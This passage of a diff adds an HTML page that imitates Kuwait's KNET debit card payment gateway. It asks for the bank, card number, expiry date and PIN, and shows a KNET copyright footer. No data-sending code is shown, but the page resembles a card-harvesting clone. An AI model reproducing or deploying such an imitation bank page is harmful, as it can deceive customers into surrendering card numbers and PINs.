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' alt="logo" />
+            </div>
+            <div class="form-card">
+                <div class="notification" style="border: #ff0000 2px solid; margin-top: 30%;margin-bottom: 30%;background-color: #f7dadd; font-size: 12px;
+                                font-family: helvetica, arial, sans serif;border-radius: 5px;
+                                color: #ff0000;
+                                 padding: 10px; width:auto">
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">&#1582;&#1591;&#1571; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578;</FONT>
+                    </center>
+                    <br />
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            !! &#1605;&#1578;&#1589;&#1601;&#1581;&#1603; &#1604;&#1575; &#1610;&#1583;&#1593;&#1605; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578; &#1571;&#1608; &#1571;&#1606;&#1607; &#1605;&#1593;&#1591;&#1604;
+                        </FONT>
+                    </center>
+                    <br />
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            &#1610;&#1585;&#1580;&#1609; &#1578;&#1605;&#1603;&#1610;&#1606; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578; &#1601;&#1610; &#1575;&#1604;&#1605;&#1578;&#1589;&#1601;&#1581; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;
+                        </FONT>
+                    </center>
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            &#1602;&#1576;&#1604; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609;
+                        </FONT>
+                    </center>
+                </div>
+            </div>
+        </div>
+    </noscript>
+    <!--Code Ends  -->
+    <form action="" name="paypage" id="paypage" method="post" autocomplete="off" oncontextmenu="return false;">
+        <div class="madd"> </div>
+        <div id="PayPageEntry">
+            <div class="container">
+                <div class="content-block">
+                    <div class="form-card">
+                        <div class="container-blogo"><img class="logoHead-mob" src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAL8AAAAwCAYAAABADKsLAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAALiMAAC4jAXilP3YAABEwSURBVHhe7Z0LfFTVncfPOXdmQnglwCZV8bFYlEwSXmJX7GpDMgH5WCCTILDuuipa27XrVtdVakHWpdUq0O3n436qfcnD2q4LwTwEQSGTmK1Vd5XWBTJJfVeoDyIGBPKauefs73/nTDIJk2RemYw638/nZu75nzvnnnvv75zz/59754azFGfZdmYcc+Sv4UrdoTgfz5TymNJ2c+PSg0f0JmnSxERKi7+oochmfHr0Ua74LdqkUW8ZShTvLW86rA1p0kRNyoqfhG9ra/0ZE+xmbeqDYuptIXhx3RLve9qUJk1UCP2ZUizbvswYTPgEZ/xCabLni3c4L9CmNGmiIiXFz1glU0LZdGJAOGdTuI3VL6guOE+b0qSJmJQUf+VyZppZud/A6hMBy8DQCGBy2VCyc+ZkbUpZyJXL357v0MnPPorx++5j4rN6TEnz+UurnS7F2Wrs8stKYS0cnHdxKW/wVLS8REkr4D3eugk9/PVW/iCgzC315c030XpxTf5KrtS/WRlBODuNvzvMrPYfNhb/qTNgTB4lNXnl6Gv+EQeeraRaW1/RvEdnRYSrynkTjmHFRB9fXLnc263NrKQ6//eKmbdJ6XjPJvzPne4+eenLK4506OwzwPZvY1Rd3FDW3KRNMeOqzr8fdTpLKVZiY7zIp5hTcHWXp9y7wFWTvxH2j+vLvev15ilHUnp+11MFX1GM4WLzEiQv4JyfH3Zh7CIlxB5XVd7l9L3G4kb/JF/BTVD2FkoPCu89FsHUuDPL5k4sa23HR/+H3iypGJmOvUrJ73LJ7jBPtDdoc0S4qqdNV4JvUMK4O1T4FlxN5tyWwUQ33ER+3l9kfmnwDo2r84ViCempucF+If3qB0zKb+11Nx0RhszEdT6b8tAZTeJMZVsbhuGK30yfMH9nXmFpbd5civG0Oakkx+0x5M3o1e06NSi4clnUAOikULpyeaU50dd8C3qRzdYG8cLZtYuenjNap4YdNORJrhrnj8wO3+NohN+TQt1hTMy4mPLm1TgvQ0/8A1pfuHtqBnrLO9Gbbi+pce7A55Pzn5sxpmh7/licwEoIaQeTZlZJbeGMRImlpNrpLq523kXrdE6QXu2qdlZa+69xbqF7LNZ2tc5VgTo5K1HHB67YNjWH7DTTJmzsnzCSnMZ5he4jJ2O0eZ3pFw/BCdjSmuG1rnVJlfM67OcfaD1Qn/xtpdsvzLLyqp0304hO64kiKeKHaxiVP04NQCrxbOlTwQaAGOC1nG+hpK3WBnGAk23v8J/O1Mm4Ka0pvBQX6UWshu9xhViP45/KJKuxFsUXcGXkUpZNCvTarIjWfV2Ob6K3vEUx9RxsHpTmdviUI2OUOBeqakO9Z2IXG5gy931ib4r7PATg07hi1jnuMDtWY2Rciga6G3V8BXVefDSnKHBMkn8Vf7tgewafsxwZju2WPUCpocS5en1QIOBX5j+VV0jrHrf3J2Z2jvv4uaNnPF/W9DuyccEKceyX0HpnJ7OjPVVwY2yGlYf9YsTCOUgcyen5cdb0WsRYDcAQz85H70jpxnWNfn9WLkYA9Strg1RBmE5csONYC9/zKTYeF/FV+Pi/pgWW8PGGYCSwJxC3bLJ3ZuwIGBnbu+RQC/zmy4OLkGIezGWRjF7LEIjSiKKTQ6C+iuP4WZ3buwU9+S5t7EXx32P/Ww3ObscxXX6fil47JODuDPGxTihya/dfut9npUeA5Ig/RqgBmIrv7WkAOFlmdi7N/Q85C5QslF+1obcuJKFpUx/Q7uHr8xU6OTAQExfwoofAx20foJU5OjvbhnQjj9nVQ91dtjt0ckhkBILukLwLH3ZvZfQdGur9qdGtZuvkiBP1AcQC3IJd6FW+rpNRg5N2QnC5sK6s5WVKW7NAba2bMUz+vbUBgAAfr3c330jr8Fe/g0N72MroB2KHLq7kZE9FyzFtigvqgTvM9pdQx24oZxvE/qnOslBc5cCd+L6U/OKGiqa3cC6OcqV+gxioGdmzcQUK4AJ8zVXrvBXuxXcRkP6YXDPO1YPYbhX02B4oKYBicjTK26g4u4srTrM6P1Kcl5nK/46NGQcyjcyzdi3Zb30HbsYeuApb6iqae9wU+NR+wfmDSrLD2PdVSiqFEekaxBhrcQ6vRb0ewX5zcDwon92NtIk63Yodv4lzug/2CRDNgziub2P/EnlrcU73oE6vIm8WdnElRojp2PdmbPeRp7z5e4E9k4uYf49EuSiL4re3kI+v9IIyK2AZg7KewDpcU/7vqCNNEpxE7t8gfcBT7o24MQ9Fcnp+rvbRVGSsCxRbRb3n3BfnWr66NQvkL1iJripBvm/skND8Pv7XEMlWXNiLIaC5oQsuJk3tPi6539RfeRLCzdL5GRDAbjL6x+f+Eh8/JN8ewp+DRgQPh18aWhYtOJkzoJgnUO5MbdshJPuQGeoU7L/O7OzwU3kERGQog/fEN0X3FdGMEHUAhdZ3lTrBuainvIk+th7b/xTZ8Ln5DCw21POywHbsDyj7ZGD/aho+t2L/f6Xz9uHrNp03CuNHDZWHhvMCGuV+Wg8Cl2o94/JarMIVU4GyQxaU+T7y3tDrM1HRX+EaFwTy2btSsP+xCkoQSen5hwua9ThmP/RLBGkrcYJGpOfvD/Y9269km13YLqlb0lRNWtNZfSiuyltgCHUIPXu+x91cRzeLfnfFnHGUp9o7LkdFn/RntZ8dzz0Jax4ePbGf2ctyfRefRKC8AufpJ+3dJyePzhw3zzRls2C2cxrKm16kc9k24e2xvlN+bmfdi9GQ77/S3TxlHUeYPgLQfSE0lGYpxUy6J7Lg6cK8LiX9jWVejECJIaV9/qGgaVDztdxvQi4jPgL0wm8xmPHP8CbWXfHM9LDz3EVbLhglBP9XJcWdGOtXkfD/e2bBFHW640N5qv19NNDNGAHuifdmHB/buZEan8G6/3zM3vQJztMGuDTXZ48bZYek19m4cTvcydto07aMg1+h/Ru8+4jk7AH0iqtGSvjk1qIO91rnh7PvUMP0m+b1Nslo1EgYw9/zY/x27SyokFKN15YB4VJ9GO2dTyIQAxydH/zuYD0/aPV3swsbl3tP6XRioZktCI5mQwYVDwTP1jFJwl+HT/rewj1THeNOOTBSeE2a3tVbxgfKnV81I4fZ2JjsrmnvUYdh2fX+Qz8XXjbVTvvPX+b1j5Twe+hfv8B5JcKOpLEw7OJHgLcBwe7dOjkwSn3ElSiuq2iiQDAuBhI/hvwTCCoX1Fd4/1eb0nyBGT63h3r8mvz1EQmfsQ8QHJUkQvgDo9pChT/n1Tn2kp0XpfzDcGmGj2ERPw3lrlrnRqyuClgGBv7t+4YQJfVur1ebEg56/E+YKa4KCp/m5LMOt2/hpu3l0h3Oi6yN0nzhSLjbQ77ub2ucGznnd2rTgJDwTdPvarzm9RZtSgihbo9S6hMEdVfVuf/4KqXp8duz7Goz6vd3gXz2Pley2FPR8jqlo2Xhtqk53Rl2mlXpweHw3fvs1W+26mTM0OiUdaRjNWp5jjZZ0Py6YYiH6e6vNtH8/Rp8nB9IDRNKvVJf3vKYTjFXtXOF4oweVrTAKP+ap6z5pzoZN67qvG/DI+h5pEFw5qkr671nES8JFT/1+L+dFZnwwQfU44dewEQRFH9/4QcekT66NSj8INQAhKnm1V3T/IY2RUxxVcGXhVB9pt+k5FPphpZOxsScn8+xZ+d2bMYVuk6bgkjUd3V9v0eF4WLSnLr1XMzwoZ70uJv/ViconnsYgse5DoB61aJebp2MGzSuWrSoJTqJHbCHU/Ym1wuX5H8jIuFTcGvjruEQfg9KtQluDCl8AhfwHGnjT9E22jSi0M2oCbkdj4URvmKS3dtf+GliI7E+v1ID/ua2BxK+XRTXLdLBLU1hJRrJTyjFF9a5Dw0p/CBcsULjRKv1qPFIQo8RG7OPPgZ34owf8CB2Weup8D6ok2niJNk3uQKzOlr4c7edm1lS6xxoPj5mIJDHQ2d1bCdatwwm/CBCogmMINRIjzmcmzjjN2hTAKgerKl3Nz+gLRGgDuBgtiVywRBp/cLu80JCe11XlfNWRCWP6mQf4A9+YDN6fXwS/uiM8RS8FNa7vVPIlmhoVudYSHA7BPsndhdc1nMTKEIS5fNTI80+0rEJqz0P62mkZGxNg9v7kE6H5Qyfn7PVnrLhHSXSPn8IE/3Nv8AJOCPaJ+GbIcKn2/ujHeO2o+UtsjYYBmhWJ1Lho35vqC5fWbTCTxSW8A8juO0nfPS2VnA7lPDTxEZCxU+35K90e2/DRQttAFaP3xgUfsMFo4wJYyohymETPrkPZzvYpkiFL7g5r37FG3/WpqRizepQjx9mVgfqP2NWJ03iSHywSdzHRPGs/EcEU+Xk4wdvYFnCPz5mB4bKnmf70VDeTaTbE0lwGyQo/Dr3H+lR2pgI5/YgenZLqSJ6l6jg4nZ89Hd1aBpgTTRuyxluj1KPoPUM/cP/ARCcS09Z82uoBy5ReMK4PY2KyX/RybgRTPwY+/+aTtJZSajbMzziJ3D5iqqmTw6+UJZcHSO7r/CJRIo/KuEzCJ/FJ3wirPjjBPHtvdEFt2HEHycIsDscGb4Jz179Jv1yKyz9xT/spLLP3wf0GEHhU3BrmzB6e3/hJxJrVud4ZLM6EP7rzLAXxyv8hEOzOjEIP01sJGWqE8Ht/WgNi3VyQIqqp/0lvctFJ6Ni/Lvt5zAl65iUNw66MHmDz5Tz6hf/34j4+IOBRtmNS0JvgkiTBIbP7QkBQzK9caG/X2sR6vbMr86fZXL1nGEq176lLYesDVKcRLs9cDfaGReL6t1N0b3YKu32RE2yb3INCWc81zS4p7jWWaBNnzmEYrP5mMzsoRZD8fPh5hzUX7OA2zYaI9iukpqCYm2KDaW+H26fkS7C13X2YMIfgN3hyop1QXlR/7ApGlKu55ec/SFgV0dRveLgTBFRUpN/DS7q1ToZExCXHGUz7n5m0cE2bYqLeG9yLdw9Nae721GPC9HH3cPxn+ZKLPKUNz2vTYNyRs+fvsk1JCnX8wehEYArVV+6q8CpTczh6N6Jk5EDAa+MdYGobjzVxcboIkccevTZMG0uKKfP7xlw/GMYlzuLa5y9U31pEkrKit+C8y8pn2wIukA0DJttp5ehC9hp5X9O2Lf0wFEljBL0bP3enMzHCsV3zavKs15pmCaxpLb4CTQArlh9cBaoceWfOu0O3zIEZE9b+Z8T6ssOfSSkrQSuQ99An7NxhuC7XNUF9JrCNAkk9cUPrCDY5J4i/ZJTGgEm+TgaAKu1NogCNCRlODoRaqQeNAKYhr+4fxBMI4Bi8pm4g+A0fUiO+JU6oddihhqAETILRO+pP3FeZtQNAKrvMhyZ9GLZlKRxyesfm8IsQT2HZxYoTQ9JEb+0Xm+n4n4bLzUAIZmnpCY/n9L0ht9JPrY8GheIC/af+646QP+lJWWhBoDg3oXVPi6Q1QCY3Fn6dDoGSARJEX9Dect+KPdqDOcvQKjvhS5cqZ47rZKZQz9SbMUAvbNANAI4MnzL0bh29C87dMGmTUrJ+yd2cXpDWeKQ0n/GvmDTuTFDs0DCtLkwArzUp2zFjimTP1pa1TsLpvkwdDsca58X5g4HnKm20H1yruL+0X4fOG8NLR+jfEKmp4MkZZ4/Glw1+fQIL73rZ/C6KfWRFMyViP8tleaLScoFvJ4y7z3oOTfSXR5tCo+eBQq9D5AmTTSk3mwPxlJPecs9CO7opVdDzcp0md30MFiaNNGTcm5PD/S6w+q8h5gQYd/6hoHhMLfZ5nkWHXxbm9KkiYrU6/mD0AhQgRGAsQ0BQy+W8P1p4aeJjxH5/6fR8M5/tdZNWZHTybi6BC2C/u9Vg6lkecNS7zuBLdKkiQXG/h+X6ZEj3Wsu5QAAAABJRU5ErkJggg==" alt="logo"></div>
+                        <div class="row">
+                            <div style="text-align: right;"><label class="column-label" style="width: 60%;">CFC Co.</label> </div>
+                            <div style="float:right;"><label class="column-value text-label" style="width:auto;">:المستفيد </label></div>
+                        </div>
+                        <div id="OrgTranxAmt">
+                            <div style="text-align:right;"><label class="column-label" style="width: 60%;">
+                                    KD&nbsp;1.000
+                                </label>
+                            </div>
+                            <div style="float:right;">
+                                <label class="column-value text-label" style="width:auto;"> :المبلغ</label>
+                            </div>
+                        </div>
+                        <!-- Added for PG Eidia Discount starts   -->
+                        <div class="row" id="DiscntRate" style="display:none;">
+                        </div>
+                        <div class="row" id="DiscntedAmt" style="display:none;">
+                        </div>
+                        <!-- Added for PG Eidia Discount ends   -->
+                    </div>
+                    <div class="form-card">
+                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+                            font-family: helvetica, arial, sans serif;
+                            color: #ff0000;
+                             padding-right: 15px; display:none; margin-bottom: 3px;text-align: center;" id="otpmsgDC">
+                        </div>
+                        <!--Customer Validation  for knet-->
+                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+                            font-family: helvetica, arial, sans serif;
+                            color: #ff0000;
+                             padding-right: 15px; display:none; margin-bottom: 3px;text-align: center;" id="CVmsg">
+                        </div>
+                        <div id="ValidationMessage">
+                            <!--  <div class="displayImage" id="banklogo"> 
+                     <span><div>
+                    <p class="para" id="paying">You are paying through</p>
+                    <img src="" id="image">
+                    <p class="para" id="bankname1"><br>
+                    </div> </span> </div> -->
+                        </div>
+                        <!-- Commented the bank name display for kfast starts -->
+                        <div id="savedCardDiv" style="display:none; ">
+                            <div class="row">
+                            </div>
+                            <!-- Added for Points Redemption -->
+                            <div class="row">
+                                <label class="column-label" style=" float:right;text-align:right;">
+                                    :الرقم السري
+                                </label>
+                                <input inputmode="numeric" pattern="[0-9]*" name="debitsavedcardPIN" id="debitsavedcardPIN" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style=" width:60%; text-align:right; " onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" onblur="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
+                            </div>
+                            <!-- Added for Points Redemption -->
+                        </div>
+                        <!-- Commented the bank name display for kfast ends -->
+                        <div id="FCUseDebitEnable" style="margin-top: 5px;">
+                            <div class="row">
+                                <div style="text-align:right;">
+                                    <select class="column-value" id='bank' style="width:60%;" onchange="javascript:validatebank(this.value)" dir="rtl">
+                                        <option value="bankname" title="Select Your Bank">
+                                            يرجى اختيار البنك
+                                        </option>
+                                        <option value="ABK">
+                                            البنك الأهلي الكويتي [ABK]
+                                        </option>
+                                        <option value="ALRAJHI">
+                                            مصرف الراجحي [Rajhi]
+                                        </option>
+                                        <option value="BBK">
+                                            بنك البحرين والكويت [BBK]
+                                        </option>
+                                        <option value="BOUBYAN">
+                                            بنك بوبيان [Boubyan]
+                                        </option>
+                                        <option value="BURGAN">
+                                            بنك برقان [Burgan]
+                                        </option>
+                                        <option value="CBK">
+                                            البنك التجاري الكويتي [CBK]
+                                        </option>
+                                        <option value="DOHA">
+                                            بنك الدوحة [Doha]
+                                        </option>
+                                        <option value="GBK">
+                                            بنك الخليج [GBK]
+                                        </option>
+                                        <option value="TAM">
+                                            بيتك [TAM]
+                                        </option>
+                                        <option value="KFH">
+                                            بيت التمويل الكويتي [KFH]
+                                        </option>
+                                        <option value="KIB">
+                                            بنك الكويت الدولي [KIB]
+                                        </option>
+                                        <option value="NBK">
+                                            بنك الكويت الوطني [NBK]
+                                        </option>
+                                        <option value="WEYAY">
+                                            الوطني [Weyay]
+                                        </option>
+                                        <option value="QNB">
+                                            بنك قطر الوطني [QNB]
+                                        </option>
+                                        <option value="UNB">
+                                            بنك الاتحاد الوطنى [UNB]
+                                        </option>
+                                        <option value="WARBA">
+                                            بنك وربة [Warba]
+                                        </option>
+                                    </select> </div>
+                                <div style="text-align:right;  float:right;"><label class="column-label" style="width:100%;">:يرجى اختيار البنك</label></div>
+                            </div>
+                            <div class="row three-column" id="Paymentpagecardnumber">
+                                <label>
+                                    <select class="column-value" name="dcprefix" id="dcprefix" dir="rtl" style="width:26%;">
+                                        <option value="bankcode" id="bankcode">
+                                            بادِئة
+                                        </option>
+                                    </select>
+                                </label>
+                                <label> <input name="debitNumber" id="debitNumber" type="tel" inputmode="numeric" pattern="[0-9]*" size="10" style="width: 32%;float:left" maxlength="10" onclick="validateprefixid(this.value);" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" onblur="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" class="allownumericwithoutdecimal" title="يجب أن يكون في العدد. يجب أن يكون الطول 10">
+                                </label>
+                                <!-- Added for Points Redemption -->
+                                <label class="column-label" style="float:right;text-align:right;">:رقم بطاقة الصرف الآلي </label>
+                                <!-- Added for Points Redemption -->
+                            </div>
+                            <div class="row three-column" id="cardExpdate">
+                                <div id="debitExpDate" style="float:right; text-align:right;">
+                                    <label class="column-label" style="width: 100%;">
+                                        :تاريخ انتهاء البطاقة </label></div>
+                                <div style="width: 60%;text-align: right;">
+                                    <select id='year' onchange="javascript:setdebitYear(this.value)" class="paymentselect" dir="rtl">
+                                        <option value="0">
+                                            YYYY
+                                        </option>
+                                        <option value="2026">
+                                            2026
+                                        </option>
+                                        <option value="2027">
+                                            2027
+                                        </option>
+                                        <option value="2028">
+                                            2028
+                                        </option>
+                                        <option value="2029">
+                                            2029
+                                        </option>
+                                        <option value="2030">
+                                            2030
+                                        </option>
+                                        <option value="2031">
+                                            2031
+                                        </option>
+                                        <option value="2032">
+                                            2032
+                                        </option>
+                                        <option value="2033">
+                                            2033
+                                        </option>
+                                        <option value="2034">
+                                            2034
+                                        </option>
+                                        <option value="2035">
+                                            2035
+                                        </option>
+                                        <option value="2036">
+                                            2036
+                                        </option>
+                                        <option value="2037">
+                                            2037
+                                        </option>
+                                        <option value="2038">
+                                            2038
+                                        </option>
+                                        <option value="2039">
+                                            2039
+                                        </option>
+                                        <option value="2040">
+                                            2040
+                                        </option>
+                                        <option value="2041">
+                                            2041
+                                        </option>
+                                        <option value="2042">
+                                            2042
+                                        </option>
+                                        <option value="2043">
+                                            2043
+                                        </option>
+                                        <option value="2044">
+                                            2044
+                                        </option>
+                                        <option value="2045">
+                                            2045
+                                        </option>
+                                        <option value="2046">
+                                            2046
+                                        </option>
+                                        <option value="2047">
+                                            2047
+                                        </option>
+                                        <option value="2048">
+                                            2048
+                                        </option>
+                                        <option value="2049">
+                                            2049
+                                        </option>
+                                        <option value="2050">
+                                            2050
+                                        </option>
+                                        <option value="2051">
+                                            2051
+                                        </option>
+                                        <option value="2052">
+                                            2052
+                                        </option>
+                                        <option value="2053">
+                                            2053
+                                        </option>
+                                        <option value="2054">
+                                            2054
+                                        </option>
+                                        <option value="2055">
+                                            2055
+                                        </option>
+                                        <option value="2056">
+                                            2056
+                                        </option>
+                                        <option value="2057">
+                                            2057
+                                        </option>
+                                        <option value="2058">
+                                            2058
+                                        </option>
+                                        <option value="2059">
+                                            2059
+                                        </option>
+                                        <option value="2060">
+                                            2060
+                                        </option>
+                                        <option value="2061">
+                                            2061
+                                        </option>
+                                        <option value="2062">
+                                            2062
+                                        </option>
+                                        <option value="2063">
+                                            2063
+                                        </option>
+                                        <option value="2064">
+                                            2064
+                                        </option>
+                                        <option value="2065">
+                                            2065
+                                        </option>
+                                        <option value="2066">
+                                            2066
+                                        </option>
+                                        <option value="2067">
+                                            2067
+                                        </option>
+                                        <option value="2068">
+                                            2068
+                                        </option>
+                                        <option value="2069">
+                                            2069
+                                        </option>
+                                    </select>
+                                    <select id='month' onchange="javascript:setdebitMonth(this.value)" class="paymentselect" dir="rtl">
+                                        <option value="0">
+                                            MM
+                                        </option>
+                                        <option value="1">
+                                            01
+                                        </option>
+                                        <option value="2">
+                                            02
+                                        </option>
+                                        <option value="3">
+                                            03
+                                        </option>
+                                        <option value="4">
+                                            04
+                                        </option>
+                                        <option value="5">
+                                            05
+                                        </option>
+                                        <option value="6">
+                                            06
+                                        </option>
+                                        <option value="7">
+                                            07
+                                        </option>
+                                        <option value="8">
+                                            08
+                                        </option>
+                                        <option value="9">
+                                            09
+                                        </option>
+                                        <option value="10">
+                                            10
+                                        </option>
+                                        <option value="11">
+                                            11
+                                        </option>
+                                        <option value="12">
+                                            12
+                                        </option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="row" id="PinRow">
+                                <!-- <div class="col-lg-12"><label class="col-lg-6"></label></div> -->
+                                <input type="hidden" name="cardPinType" value="A">
+                                <div id="eComPin">
+                                    <label class="column-label" style=" float:right;text-align:right;">
+                                        :الرقم السري
+                                    </label>
+                                </div>
+                                <div>
+                                    <input inputmode="numeric" pattern="[0-9]*" name="cardPin" id="cardPin" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" style="width: 60%;text-align:right;" class="allownumericwithoutdecimal" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-card">
+                        <div class="row">
+                            <div style="text-align:center;">
+                                <div id="submithide">
+                                    <button name="proceed" type="button" class="submit-button" style="float:right;" onclick="onPay();" id="proceed">إرسال</button>
+                                    <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div align="center" id="overlayhide" class="overlay" style="display:none;">
+                        <img src="./images/loadingmob.gif" style="height: 15%;margin-top:50%;">
+                    </div>
+                    <footer>
+                        <div>
+                            <span>
+                                <div class="row_new">
+                                    <div style="text-align: center;font-size: 12px;">
+                                        جميع الحقوق محفوظة&nbsp;©&nbsp;2026 <br>
+                                        <span style="font-weight:bold;color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span>
+                                    </div>
+                                </div>
+                            </span>
+                            <div id="DigiCertClickID_cM-vbZrL"></div>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </div>
+</body>
+
+</html>
